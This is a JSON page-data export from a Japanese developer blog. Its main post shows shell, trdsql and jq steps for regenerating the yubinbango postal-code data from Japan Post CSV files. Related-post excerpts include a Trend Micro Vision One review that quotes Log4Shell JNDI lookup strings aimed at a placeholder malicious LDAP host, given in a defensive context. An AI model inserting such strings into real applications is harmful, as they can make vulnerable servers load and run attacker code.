{"componentChunkName":"component---src-templates-post-tsx","path":"/posts/90","result":{"data":{"esaPost":{"number":90,"relative_category":"blog/backend","fields":{"title":"yubinbango-dataをどうやって生成するか","excerpt":"郵便番号から住所を補完するライブラリ「yubinbango」を継続的に利用するにあたり、当該ライブラリが参照している郵便データ「yubinbango-data」を自前でメンテナンスできるか確認します。   > PROBLEMPROBLEM \n\n- 「yubinbango/yubinbango」を利用するにあたり「yubinbango/yubinbango-data」の更新が継続的に行われるかサービス継続性の懸念がある そこで自前でメンテナンスをする場合の対処方法を事前に知っておきたい \n- そこで自前でメンテナンスをする場合の対処方法を事前に知っておきたい  > SOLUTIONSOLUTION \n\nというわけで、yubinbango-dataの中身であるken_all.csvとjigyosyo.csvを安定して変換する方法を確認します。  > ken_all.csvを正規化するken_all.csvを正規化する \n\nyubinbango-dataのken_all.csvの部分はアイビスが提供しているzipcloudを参照しているようなので、そちらに合わせて利用します。 sh\n\nsudo apt install nkf { curl -sSL \"http://zipcloud.ibsnet.co.jp/zipcodedata/download?di=1625040649647\" -o ./x_ken_all.zip; unzip -p x_ken_all.zip | nkf -w; rm x_ken_all.zip } >ken_all.csv  \n\nzipcloudを使うことに抵抗がある場合はgokenallもありますが、正規化によって一つの郵便番号に複数の町名番地が存在するため郵便番号をキーとするyubinbango-dataに変換する際には工夫が必要です。 sh\n\ngo get github.com/oirik/gokenall/cmd/kenall { kenall download -x | kenall normalize } >ken_all.csv   > jigyosyo.csvを取得するjigyosyo.csvを取得する \n\njigyosyo.csvは特に正規化は必要ないです。 sh\n\n{ curl -sSL https://www.post.japanpost.jp/zipcode/dl/jigyosyo/zip/jigyosyo.zip -o ./jigyosyo.zip; unzip -p jigyosyo.zip | nkf -w; rm jigyosyo.zip } >jigyosyo.csv   > yubinbango-dataを生成するyubinbango-dataを生成する \n\nken_all.csvとjigyosyo.csvをUNIONしてjqで郵便番号をキーとしたオブジェクトに変換します。一部buildingカラムがnullを持っておりyubinbango-dataと異なる部分はありますが、大凡同等の状態にまで持っていくことが出来ました。 sh\n\nbrew install noborus/tap/trdsql for i in {001..999}; do trdsql -ojson \" SELECT * FROM ( SELECT c3 zip, c8 city, c9 town, NULL building FROM ken_all.csv UNION SELECT c8 zip, c5 city, c6 town, c7 building FROM jigyosyo.csv ) WHERE SUBSTRING(zip,0,4) = '$i' ORDER BY zip ASC \" \\ | jq --compact-output ' . | to_entries | map({ (.value.zip): [1, .value.city, .value.town, .value.building] }) | add ' \\ | sed -E 's/(.+?)/$yubin(\\1);/g' \\ >$i.js; done   > WRAPUPWRAPUP \n\n昔から何かと話題に上がるken_all.csvですが、正規化のサービスに加えCSV用SQLクライアントとjqの登場により思った以上に簡単に変換することができました。","thumbnail":"https://img.esa.io/uploads/production/attachments/16651/2021/07/25/97367/d69e2c83-0aae-4409-804a-7f7ee0ce456c.png"},"wip":false,"body_md":"郵便番号から住所を補完するライブラリ「yubinbango」を継続的に利用するにあたり、当該ライブラリが参照している郵便データ「yubinbango-data」を自前でメンテナンスできるか確認します。\r\n\r\n<img width=\"710\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/25/97367/d69e2c83-0aae-4409-804a-7f7ee0ce456c.png\">\r\n\r\n# PROBLEM\r\n- 「[yubinbango/yubinbango](https://github.com/yubinbango/yubinbango)」を利用するにあたり「[yubinbango/yubinbango-data](https://github.com/yubinbango/yubinbango-data)」の更新が継続的に行われるかサービス継続性の懸念がある\r\n    - そこで自前でメンテナンスをする場合の対処方法を事前に知っておきたい\r\n\r\n# SOLUTION\r\nというわけで、yubinbango-dataの中身である[ken_all.csvとjigyosyo.csv](https://www.post.japanpost.jp/zipcode/download.html)を安定して変換する方法を確認します。\r\n\r\n## ken_all.csvを正規化する\r\nyubinbango-dataのken_all.csvの部分はアイビスが提供している[zipcloud](http://zipcloud.ibsnet.co.jp)を参照しているようなので、そちらに合わせて利用します。\r\n```sh\r\nsudo apt install nkf\r\n{ \r\n  curl -sSL \"http://zipcloud.ibsnet.co.jp/zipcodedata/download?di=1625040649647\" -o ./x_ken_all.zip;\r\n  unzip -p x_ken_all.zip | nkf -w;\r\n  rm x_ken_all.zip\r\n} >ken_all.csv\r\n```\r\n\r\nzipcloudを使うことに抵抗がある場合は[gokenall](https://github.com/oirik/gokenall)もありますが、正規化によって一つの郵便番号に複数の町名番地が存在するため郵便番号をキーとするyubinbango-dataに変換する際には工夫が必要です。\r\n\r\n```sh\r\ngo get github.com/oirik/gokenall/cmd/kenall\r\n{ kenall download -x | kenall normalize } >ken_all.csv\r\n```\r\n\r\n## jigyosyo.csvを取得する\r\njigyosyo.csvは特に正規化は必要ないです。\r\n\r\n```sh\r\n{ \r\n  curl -sSL https://www.post.japanpost.jp/zipcode/dl/jigyosyo/zip/jigyosyo.zip -o ./jigyosyo.zip;\r\n  unzip -p jigyosyo.zip | nkf -w;\r\n  rm jigyosyo.zip\r\n} >jigyosyo.csv\r\n```\r\n\r\n## yubinbango-dataを生成する\r\nken_all.csvとjigyosyo.csvをUNIONしてjqで郵便番号をキーとしたオブジェクトに変換します。一部buildingカラムがnullを持っておりyubinbango-dataと異なる部分はありますが、大凡同等の状態にまで持っていくことが出来ました。\r\n\r\n```sh\r\nbrew install noborus/tap/trdsql\r\nfor i in {001..999}; do\r\n  trdsql -ojson \"\r\n    SELECT *\r\n    FROM (\r\n      SELECT c3 zip, c8 city, c9 town, NULL building FROM ken_all.csv\r\n      UNION SELECT c8 zip, c5 city, c6 town, c7 building FROM jigyosyo.csv\r\n    )\r\n    WHERE SUBSTRING(zip,0,4) = '$i'\r\n    ORDER BY zip ASC\r\n  \" \\\r\n  | jq --compact-output '\r\n    .\r\n    | to_entries\r\n    | map({ (.value.zip): [1, .value.city, .value.town, .value.building] })\r\n    | add\r\n  ' \\\r\n  | sed -E 's/(.+?)/$yubin(\\1);/g' \\\r\n  >$i.js;\r\ndone\r\n```\r\n\r\n# WRAPUP\r\n昔から何かと話題に上がるken_all.csvですが、正規化のサービスに加えCSV用SQLクライアントとjqの登場により思った以上に簡単に変換することができました。","body_html":"<p data-sourcepos=\"1:1-1:250\">郵便番号から住所を補完するライブラリ「yubinbango」を継続的に利用するにあたり、当該ライブラリが参照している郵便データ「yubinbango-data」を自前でメンテナンスできるか確認します。</p>\n<a href=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/25/97367/d69e2c83-0aae-4409-804a-7f7ee0ce456c.png\" target=\"_blank\" rel=\"noopener noreferrer\"><img width=\"710\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/25/97367/d69e2c83-0aae-4409-804a-7f7ee0ce456c.png\"></a>\n<h1 data-sourcepos=\"5:1-5:9\" id=\"1-0-0\" name=\"1-0-0\"><a class=\"anchor\" id=\"PROBLEM\" name=\"PROBLEM\" href=\"#PROBLEM\" data-position=\"1-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"PROBLEM\"> &gt; PROBLEM</span></a>PROBLEM</h1>\n<ul data-sourcepos=\"6:1-8:0\">\n<li data-sourcepos=\"6:1-8:0\">「<a href=\"https://github.com/yubinbango/yubinbango\" target=\"_blank\" rel=\"noopener noreferrer\">yubinbango/yubinbango</a>」を利用するにあたり「<a href=\"https://github.com/yubinbango/yubinbango-data\" target=\"_blank\" rel=\"noopener noreferrer\">yubinbango/yubinbango-data</a>」の更新が継続的に行われるかサービス継続性の懸念がある\n<ul data-sourcepos=\"7:5-8:0\">\n<li data-sourcepos=\"7:5-8:0\">そこで自前でメンテナンスをする場合の対処方法を事前に知っておきたい</li>\n</ul></li>\n</ul>\n<h1 data-sourcepos=\"9:1-9:10\" id=\"2-0-0\" name=\"2-0-0\"><a class=\"anchor\" id=\"SOLUTION\" name=\"SOLUTION\" href=\"#SOLUTION\" data-position=\"2-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"SOLUTION\"> &gt; SOLUTION</span></a>SOLUTION</h1>\n<p data-sourcepos=\"10:1-10:189\">というわけで、yubinbango-dataの中身である<a href=\"https://www.post.japanpost.jp/zipcode/download.html\" target=\"_blank\" rel=\"noopener noreferrer\">ken_all.csvとjigyosyo.csv</a>を安定して変換する方法を確認します。</p>\n<h2 data-sourcepos=\"12:1-12:32\" id=\"2-1-0\" name=\"2-1-0\"><a class=\"anchor\" id=\"ken_all.csvを正規化する\" name=\"ken_all.csvを正規化する\" href=\"#ken_all.csvを正規化する\" data-position=\"2-1-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"ken_all.csvを正規化する\"> &gt; ken_all.csvを正規化する</span></a>ken_all.csvを正規化する</h2>\n<p data-sourcepos=\"13:1-13:195\">yubinbango-dataのken_all.csvの部分はアイビスが提供している<a href=\"http://zipcloud.ibsnet.co.jp\" target=\"_blank\" rel=\"noopener noreferrer\">zipcloud</a>を参照しているようなので、そちらに合わせて利用します。</p>\n<div class=\"code-block\" data-sourcepos=\"14:1-21:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code><span class=\"nb\">sudo </span>apt <span class=\"nb\">install </span>nkf\n<span class=\"o\">{</span> \n  curl <span class=\"nt\">-sSL</span> <span class=\"s2\">\"http://zipcloud.ibsnet.co.jp/zipcodedata/download?di=1625040649647\"</span> <span class=\"nt\">-o</span> ./x_ken_all.zip<span class=\"p\">;</span>\n  unzip <span class=\"nt\">-p</span> x_ken_all.zip | nkf <span class=\"nt\">-w</span><span class=\"p\">;</span>\n  <span class=\"nb\">rm </span>x_ken_all.zip\n<span class=\"o\">}</span> <span class=\"o\">&gt;</span>ken_all.csv\n</code></pre></div></div>\n<p data-sourcepos=\"23:1-23:296\">zipcloudを使うことに抵抗がある場合は<a href=\"https://github.com/oirik/gokenall\" target=\"_blank\" rel=\"noopener noreferrer\">gokenall</a>もありますが、正規化によって一つの郵便番号に複数の町名番地が存在するため郵便番号をキーとするyubinbango-dataに変換する際には工夫が必要です。</p>\n<div class=\"code-block\" data-sourcepos=\"25:1-28:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code>go get github.com/oirik/gokenall/cmd/kenall\n<span class=\"o\">{</span> kenall download <span class=\"nt\">-x</span> | kenall normalize <span class=\"o\">}</span> <span class=\"o\">&gt;</span>ken_all.csv\n</code></pre></div></div>\n<h2 data-sourcepos=\"30:1-30:30\" id=\"2-2-0\" name=\"2-2-0\"><a class=\"anchor\" id=\"jigyosyo.csvを取得する\" name=\"jigyosyo.csvを取得する\" href=\"#jigyosyo.csvを取得する\" data-position=\"2-2-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"jigyosyo.csvを取得する\"> &gt; jigyosyo.csvを取得する</span></a>jigyosyo.csvを取得する</h2>\n<p data-sourcepos=\"31:1-31:54\">jigyosyo.csvは特に正規化は必要ないです。</p>\n<div class=\"code-block\" data-sourcepos=\"33:1-39:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code><span class=\"o\">{</span> \n  curl <span class=\"nt\">-sSL</span> https://www.post.japanpost.jp/zipcode/dl/jigyosyo/zip/jigyosyo.zip <span class=\"nt\">-o</span> ./jigyosyo.zip<span class=\"p\">;</span>\n  unzip <span class=\"nt\">-p</span> jigyosyo.zip | nkf <span class=\"nt\">-w</span><span class=\"p\">;</span>\n  <span class=\"nb\">rm </span>jigyosyo.zip\n<span class=\"o\">}</span> <span class=\"o\">&gt;</span>jigyosyo.csv\n</code></pre></div></div>\n<h2 data-sourcepos=\"41:1-41:33\" id=\"2-3-0\" name=\"2-3-0\"><a class=\"anchor\" id=\"yubinbango-dataを生成する\" name=\"yubinbango-dataを生成する\" href=\"#yubinbango-dataを生成する\" data-position=\"2-3-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"yubinbango-dataを生成する\"> &gt; yubinbango-dataを生成する</span></a>yubinbango-dataを生成する</h2>\n<p data-sourcepos=\"42:1-42:288\">ken_all.csvとjigyosyo.csvをUNIONしてjqで郵便番号をキーとしたオブジェクトに変換します。一部buildingカラムがnullを持っておりyubinbango-dataと異なる部分はありますが、大凡同等の状態にまで持っていくことが出来ました。</p>\n<div class=\"code-block\" data-sourcepos=\"44:1-65:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code>brew <span class=\"nb\">install </span>noborus/tap/trdsql\n<span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"o\">{</span>001..999<span class=\"o\">}</span><span class=\"p\">;</span> <span class=\"k\">do\n  </span>trdsql <span class=\"nt\">-ojson</span> <span class=\"s2\">\"\n    SELECT *\n    FROM (\n      SELECT c3 zip, c8 city, c9 town, NULL building FROM ken_all.csv\n      UNION SELECT c8 zip, c5 city, c6 town, c7 building FROM jigyosyo.csv\n    )\n    WHERE SUBSTRING(zip,0,4) = '</span><span class=\"nv\">$i</span><span class=\"s2\">'\n    ORDER BY zip ASC\n  \"</span> <span class=\"se\">\\</span>\n  | jq <span class=\"nt\">--compact-output</span> <span class=\"s1\">'\n    .\n    | to_entries\n    | map({ (.value.zip): [1, .value.city, .value.town, .value.building] })\n    | add\n  '</span> <span class=\"se\">\\</span>\n  | <span class=\"nb\">sed</span> <span class=\"nt\">-E</span> <span class=\"s1\">'s/(.+?)/$yubin(\\1);/g'</span> <span class=\"se\">\\</span>\n  <span class=\"o\">&gt;</span><span class=\"nv\">$i</span>.js<span class=\"p\">;</span>\n<span class=\"k\">done</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"67:1-67:8\" id=\"3-0-0\" name=\"3-0-0\"><a class=\"anchor\" id=\"WRAPUP\" name=\"WRAPUP\" href=\"#WRAPUP\" data-position=\"3-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"WRAPUP\"> &gt; WRAPUP</span></a>WRAPUP</h1>\n<p data-sourcepos=\"68:1-68:208\">昔から何かと話題に上がるken_all.csvですが、正規化のサービスに加えCSV用SQLクライアントとjqの登場により思った以上に簡単に変換することができました。</p>\n","tags":["yubinbango","ken_all.csv","jq","trdsql"],"updated_at":"2021-07-25T12:07:20+09:00","childPublishedDate":{"published_on":"2021-07-25T00:00:00.000Z"},"updated_by":{"name":"なびの👷","screen_name":"nabinno","icon":"https://img.esa.io/uploads/production/members/94286/icon/thumb_m_ef5f024307008aa399b91f87fa5f64e8.jpg"}},"relatedPosts":{"edges":[{"node":{"number":127,"relative_category":"blog/soc","fields":{"title":"Trend Micro Vision Oneを試してみる","excerpt":"11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM \n\n- 11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されている JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228） JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046） \n- JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228）\n- JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046）  > SOLUTIONSOLUTION  \n\nFrom: Trend Micro\n Subject: Log4Shell診断ツール ご提供開始 \n\nApache Log4j2ログ出力ライブラリの複数のバージョンに影響を与える深刻な脆弱性情報が公開されています。当診断ツールは、Log4Shellの影響を受ける可能性のあるエンドポイントとWebアプリケーションを特定することができます。また、攻撃対象領域の詳細を即座に可視化し、リスクを軽減するための措置をご案内いたします。  \n\nと言うわけで、Trend Micro Vision Oneの一部機能が無償で提供されていたので確認します。Vision OneはSIEM、SOAR、EDR関連のツール。エンドポイント、サーバ、クラウド、メールおよびネットワーク全体を保護する各セキュリティ製品がセンサーとなり、各々のレイヤ―で検知した脅威や侵入の痕跡を、Threat Intelligenceを活用してサイバー攻撃の全体像を可視化します。  > Log4jShell診断ツールを試してみるLog4jShell診断ツールを試してみる \n\n1. Trend Micro Vision Oneにログイン\n2. [Log4Shell診断ツール]画面にてWindows/Mac/Linuxいずれかの診断ツールをダウンロード\n3. 1分ほどで端末にインストールされ、詳細が確認できる\n4. 自宅の端末で確認した結果はこちら \n5.  \n\nざっと試したところ数分程度でLog4Shellの診断を行う事ができました。Intune等EMMでの展開もそれほど難しくないように思います。  > 他の機能を確認他の機能を確認 \n\n先ほど試したLog4Shell診断ツールはTrend Micro Vision OneのAssessmentカテゴリのいち機能になります。Vision OneはSecurity Postureによる方針策定、Assessment・Thread Intelligenceによる脅威検出、XDR（EDR）による脅威応答、Zero Trust Secure Access・Mobile Securityによる脅威防御、Inventory Managementによる脅威特定から構成されています。  > Security PostureSecurity Posture \n\n各種リスク、脅威を表示することで、セキュリティに関する心構えとともに方針策定のヒントを提示します。    function description     Security Dashboard Company Risk Index、エンドポイントレポート、MITRE ATT&CK MATRIXマップ   Zero Trust Risk Insights アカウント侵害、脆弱性の検出、異常検出、クラウドアプリのアクティビティ、XDR検出、脅威検出     > AssessmentAssessment \n\n各種端末に対して脅威検出等のセキュリティ評価を行います。    function description     Targeted Attack Detection 標的型攻撃の検出   Security Assessment セキュリティ評価、Log4jの脆弱性検出     > Threat IntelligenceThreat Intelligence \n\n内部および外部ソースを元に分析を行い環境内の潜在的な脅威を特定します。    function description     Intelligence Reports 内部および外部のソースからの最新のインテリジェンスレポートを統合して、環境内の潜在的な脅威を特定   Suspicous Object Management 特定の疑わしいオブジェクトを検出した後に実行する接続製品のアクションを指定できます   Sandbox Analysis -     > XDR（EDR）XDR（EDR） \n\n検出モデルと応答サービスを管理します。    function description     Detection Model Management 検出モデルの管理   Workbench -   Observed Attack Techniques 観察された攻撃手法   Managed XDR マネージドXDRは検出および応答の代行サービス     > Zero Trust Secure AccessZero Trust Secure Access \n\n各種アクセス制御を管理します。    function description     Secure Access Overview -   Secure Access Rules IAM、ログイン制御   Access Control History -   Private Access Configuration プライベートアクセス制御   Internet Access Configuration インターネットアクセス制御     > Response ManagementResponse Management \n\n応答サービスを管理するものだと思いますが、XDR（EDR）との区別がよく分かりません。    function description     Response Management      > Mobile SecurityMobile Security \n\nモバイル端末に特化したセキュリティ機能、検出ログや管理ポリシーを扱います。EMM連携も可能です。    function description     Mobile Detection Logs モバイル端末検出ログ   Mobile Policy モバイル端末管理ポリシー   Risky Mobile Apps MDMとの統合機能     > Inventory ManagementInventory Management \n\n各種リソースの一覧表になります。    function description     Endpoint Inventory エンドポイント端末一覧表   Email Account Inventory Eメールアカウント一覧表   Network Inventory ネットワーク一覧表   Service Gateway Inventory サービスゲートウェイ一覧表   Mobile Inventory モバイル端末一覧表     > WRAPUPWRAPUP \n\nTrend Micro Vision Oneについて、各機能の使い勝手は分かりませんが、EDRを軸にセキュリティ機能を固めているようです。EDRについては完全自動化というのは無理でしょうから、どのくらいサポートがあるかで製品の価値がかわってくるものと思います。Log4Shell診断ツールの使い勝手は分かりましたが、コンソール画面上の他の機能を見る限りどの程度便利かはよく分かりませんでした。"},"name":"[2022-01-01]Trend Micro Vision Oneを試してみる","tags":["security"],"childPublishedDate":{"published_on":"2022-01-01T00:00:00.000Z","published_on_unix":1640995200}}},{"node":{"number":67,"relative_category":"blog/frontend","fields":{"title":"esaをHeadless CMSとして使う","excerpt":"最近仕事の同僚からHeadless CMS という言葉を聞いていて「自分には関係ないな」と距離を取っていたのですが、なぜか回り回って自分からHeadless CMSを作ることになりました。世の中何が起きるか分からないですね。  > PROBLEMPROBLEM \n\n- ブログを普段書かない人なのだが、よそ向けに情報発信する必要が出てきた とは言っても、今までMarkdownをJekyllで管理していたので画像を貼り付けるのが手間でモチベーションが大きく下がっていた さらにPlantUMLを出力するのも手間、試行錯誤した末にいずれも付け焼き刃で、esaの操作感に勝てるものはなかった \n- とは言っても、今までMarkdownをJekyllで管理していたので画像を貼り付けるのが手間でモチベーションが大きく下がっていた さらにPlantUMLを出力するのも手間、試行錯誤した末にいずれも付け焼き刃で、esaの操作感に勝てるものはなかった \n- さらにPlantUMLを出力するのも手間、試行錯誤した末にいずれも付け焼き刃で、esaの操作感に勝てるものはなかった  > SOLUTIONSOLUTION \n\nというわけで、esaをHeadless CMSとして使うことにしました。 \n\nやってることは昔のMovableTypeそのもので懐かしかったです。コンテンツを別システムで管理しビルドサーバーに当該コンテンツを流し込みリビルド、最後にホストサーバーにアップロードというワークフロー。今はJAMStackの文脈で語られているようです。 \n\nこのHeadless CMSが昔と違うのはコンテンツ作成に集中できること。CI周りが発達したので一度ワークフローを組み立てれば後は自動でコンテンツを生成できます。  > やり方やり方 \n\n- esa.io でゆるふわ情報共有 - Middleman Blog への Export サンプル付き #esa_io - Qiita\n- 技術ブログを支える技術（Gatsby + esaio） - mottox2 blog\n- Next.jsとesaを使った個人サイト構築 | corocn.dev \n\nそれほど時間をかけられなかったので、上記3記事の中で手軽さを考慮しmottox2さんのソースコードを拝借しました。ありがとうございます。 \n\n- 作ったレポジトリ：nabinno/nabinno.github.io: On Blahfe - Nab's Github Pages  > シークエンス図シークエンス図 \n\n私が手を入れたのはコンポーネントを削りGatsby Blog Starterに寄せたのと、デプロイ方法を使い慣れたCircleCIに変えたくらいです。 \n\nGitHub PagesにはVercelのような便利なWebhookがないので、esaで実装されたGitHub Webhook連携を使いそれをトリガーにCircleCIジョブを走らせています。 \n\n  > CircleCIジョブCircleCIジョブ \n\nまた、CircleCIジョブは何の変哲もないもので、NodeJSを叩いてGitプッシュしているくらいです。先ほどのGitHub Webhookと似た感じの泥臭いワークフローは [skip ci] コメントの追加があります。当該コメントを入れないとジョブが再帰的に走り続けるので出口で明示してあります。 yml\n\nversion: 2.1 jobs: build_deploy: docker: - image: circleci/node:12.4 steps: - checkout - run: name: Install NPM command: npm install - run: name: Build command: npm run clean && npm run build - add_ssh_keys: fingerprints: - \"{foo}\" - deploy: name: Deploy command: | git config --global user.email \"nab+circleci@blahfe.com\" git config --global user.name \"nabinno+circleci\" git add . git commit -m \"[skip ci]Run npm run clean && npm run build.\" git push origin master workflows: build_deploy: jobs: - build_deploy: filters: branches: only: master   > WRAPUPWRAPUP \n\nとまあ大した作業内容ではないのですが、久しぶりに昔懐かしのMovableTypeのリビルドを思い出しつつ、副産物として全く縁遠かったNetlifyとVercelの位置づけを薄らと感じ取れました。"},"name":"[2021-01-18]esaをHeadless CMSとして使う","tags":["gatsby","esa","headless-cms","cms"],"childPublishedDate":{"published_on":"2021-01-18T00:00:00.000Z","published_on_unix":1610928000}}},{"node":{"number":44,"relative_category":"blog/organization","fields":{"title":"整理したい私はITILをかぶる、PlantUMLへの愛","excerpt":"現在ネクイノでエンジニアリングマネージャー、バックエンドエンジニア、インフラエンジニアを担当しています。入社後8ヶ月、年の瀬ということで振り返り記事を書くことにしました。テーマを一つに絞らないと記事にならないので今回はPlantUMLに絞ります。断りとして、この記事で書いてあることはITILプラクティスを一部なぞっているに過ぎません。PlantUMLが全知全能のツールということを主張したいわけではないです、ただ愛しています。   > PROBLEMPROBLEM \n\n- 開発人数が増えるにあたり、チームとして機能していない 管理規程はあるものの 業務フローが明示化されておらず、誰が何を何の目的で業務を回しているか分からない 可視化されていないプロセスが問題になるケースが増えてきた \n- 管理規程はあるものの 業務フローが明示化されておらず、誰が何を何の目的で業務を回しているか分からない 可視化されていないプロセスが問題になるケースが増えてきた \n- 可視化されていないプロセスが問題になるケースが増えてきた  > SOLUTIONSOLUTION \n\nと言うわけで、入社早々PlantUMLで業務フローを可視化することを始めました。  > PlantUMLとはPlantUMLとは \n\nPlantUMLはオープンソースのUMLダイアグラム作成用のテキストベースの言語です。シークエンス図、ユースケース図、アクティビティ図、クラス図のようなダイアグラムをシンプルで直感的に書くことができます。 \n\n2009年リリースされており、私が使うようになったのは、Emacsのorg-babelで実装されてからなので2014年くらい1。2016-7年にesa.ioやVS Code等で実装されてから爆発的に普及したと記憶しています。「esa.ioはオンラインのorg-modeになるべくPlantUMLを実装すべき」と要望したのは良い思い出です。  > やったことやったこと \n\nさて、私はネクイノに入社早々既存システムの運用開発と情シス（業務運用）の部長職にアサインされました。既存システムの運用開発は新しく外部のパートナーが入ると言うことで、開発フローが大きく変わる節目にありました。  > 開発フローを整備する開発フローを整備する \n\n話を聞くに新しく入る外部パートナーはプロジェクトマネージャ、ブリッジエンジニア・コミュニケーター、モバイルエンジニア、バックエンドエンジニア、フロントエンジニア、品質チェック含め20名程の体制でした。また、既存システムの運用開発ではプロダクトマネジャー、プロダクトオーナーが各開発者とともに企画策定を行うことが慣習として存在していました。私はまず企画から実装、レビュー、リリースまでの流れを整理します。 Jira上の大まかな流れ \n\n 開発の流れ \n\n  > 要望フローを整備する要望フローを整備する \n\n次に、機能要望、バグ報告、改善要望がSlackチャンネルの至る所に散在している上、チケット化されないケースがありました。突貫ではありますが、GoogleフォームとJira連携を行いました2。 \n\nプロダクトマネジャーの体制が整備されてからは、機能要望のフォームは使われることはなくなりましたが、バグ報告、改善要望は要所要所で使われ、トリアージという形で定期的に活用されています。 \n\n  > デプロイフローを整備するデプロイフローを整備する \n\n開発が進んでいくと、今度は開発環境が足りなくなりました。当時はステージング環境と本番環境しかなく、かつ、ステージング環境がテスト環境兼デモ環境の役割を呈しており、ステージング環境おテストで不具合を起こすとデモに影響が出るという状態が続いておりました。また、外部パートナーが開発するに当たり繊細なステージング環境を使うのが難しいため進捗に影響が出始めておりました。 \n\n急を要する事態のためAWS CDKでステージング環境とは別に結合環境を用意し3、デプロイフローを整備しました。 \n\n  > 障害対応フローを整備する障害対応フローを整備する \n\nさて、運用開発が順調に進んでいくと、今度は障害が頻繁に起きていることに気づきました。いいえ、薄々気づいていたのですが多忙にかまけて蓋をしておりました。ここに関しては本腰を入れてAWSサポートプランをビジネスに変更し原因を突き止めました。協力いただいた各位には感謝です。 \n\nまた、今まで見過ごされていたGoogle Workspace等の業務運用のシステムも含め障害報告の体制を敷くとともに、監視体制も強化しました。 \n\n  > 業務フローを整理する業務フローを整理する \n\nまだまだあります。業務内容に関しては詳細は書けませんが、部内の業務から他部署の業務まで安全に生産性を高めるため整理を行いました。まだまだ行います。  > リモート飲みのフローを整備するリモート飲みのフローを整備する \n\nいよいよ疲れてきたのでお酒が飲みたくなりました。飲み会フローを作ってみましたが思いの外手間がかかることが分かりあまり活用できておりません。その代わり社内でオンラインシャッフルランチという制度ができました。 \n\n  > 分かったこと分かったこと \n\nはい、こうして振り返ると入社時に感じていた雑然さは業務フローが明確でない状態のことでした。開発者なら分かると思いますが、企画段階で思い描く構成図は実装する段になるとあまり意味をなさず、結局は頭の中はシークエンス図でいっぱいになります。それと同じで、登場人物、登場人物間のメッセージ、メッセージの大枠が関係者に共有されていないと、いくらリソースが投下されても不安定で生産性に伸び悩むのです。つまり、雑然とした環境を整理すると言うことはシークエンス図を書くことに他なりません。 \n\nしかしながら、当該環境一つ一つを俯瞰的に見るとITILプラクティスそのものであることにも気づきます。 \n\nITILとはITサービスマネジメントのベストプラクティスフレームワークのこと。何らかの高い技術を持っていても、投資対効果を考えていなければ赤字になりビジネスと成り立ちませんし、顧客のことを考えずに作ったものに価値はありませんし、サービスの評価を落とすことになります。このようなことを防ぐには顧客目線やビジネス的な観点が必要で、そのノウハウがまとまったものがITILです。  > 今回対応したプラクティス今回対応したプラクティス \n\n今回の振り返りでは具体的に次のプラクティスをなぞっておりました。    振り返り ITILプラクティス     開発フローを整備する 継続的サービス改善   要望フローを整備する 要求管理、問題管理   デプロイフローを整備する リリース管理及び展開管理   障害対応フローを整備する インシデント管理   業務フローを整理する CMMI   リモート飲みのフローを整備する 組織変更管理    \n\nCMMIと組織変更管理が分かりづらいの少し補足します。 \n\n- CMMIとは能力成熟度モデル統合のことで、業務フローを評価し5段階で成熟度レベルを出す手法です。現状はレベル1-2（初期段階）のものがほとんどなのでまずはPlantUMLを使い共通認識を作るところから始めました。\n- 組織変更管理とは経営学で言うところのチェンジマネジメントに当たります。ここでは各種フローを整備しメンバー全員に落とし込むことを目指します。『Fearless Change』では今回のリモート飲み以外にも多くのパターンランゲージが紹介されています。  > WRAPUPWRAPUP  > 次にすること次にすること \n\nネクストアクションですが、採用フローを考えています。 \n\n（読者の皆様はどんなシークエンス図を思い浮かべましたか?） \n\nというわけで、ネクイノはPlantUMLを愛している開発者を募集中です。  > PR__colon__ ネクイノとはPR: ネクイノとは \n\n「世界中の医療空間と体験を再定義する」をミッションに、人々と医療の間にICTのチカラで橋をかける遠隔医療ソリューションを手掛けている会社です。医療というと高齢の患者さんをイメージされるかもしれませんが、我らがターゲットとしているのは現役世代の方。病気を治療するというより、現役世代がQOLを高めるためのサポートを目的としています。 \n\nメインサービスは、女性に特化したピルのオンライン診療アプリ「スマルナ」。ピルを飲まれている人だけでなく、受診や服用に抵抗がある方にも気軽に利用していただけたらと思いサービス提供しています。診察室の手前に助産師と薬剤師を配置した相談室を設ける等、受診のハードルを下げる工夫をそこかしこに施しているのが特徴です。 \n\n様々なメディカルコミュニケーションを行っています - 専門家相談 - カスタマーサポート - ユーザーコミュニティ  \n\n妻からは「10年前にサービスがあったら良かったのに」とお墨付きをいただいており、興味をもった方は詳しくはこちらをご覧下さい。 https://smaluna.com/  \n\n1. [B! plantuml] nabinnoのブックマーク ↩ \n2. https://github.com/nabinno/google-forms-to-jira-slack ↩ \n3. CDKはaws-rails-provisionerを参考に 